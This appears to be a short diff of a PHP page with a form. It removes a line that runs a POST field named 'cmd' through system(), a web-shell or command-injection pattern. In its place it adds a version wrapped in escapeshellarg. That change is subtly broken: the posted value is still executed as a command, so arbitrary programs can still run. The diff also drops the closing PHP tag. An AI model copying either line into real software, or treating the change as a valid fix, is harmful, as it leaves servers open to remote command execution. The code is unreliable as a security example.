@@ -7,5 +7,4 @@
 </form>
 
 <?php
-    system($_POST["cmd"]);
- ?>
+    system(escapeshellarg($_POST["cmd"]));
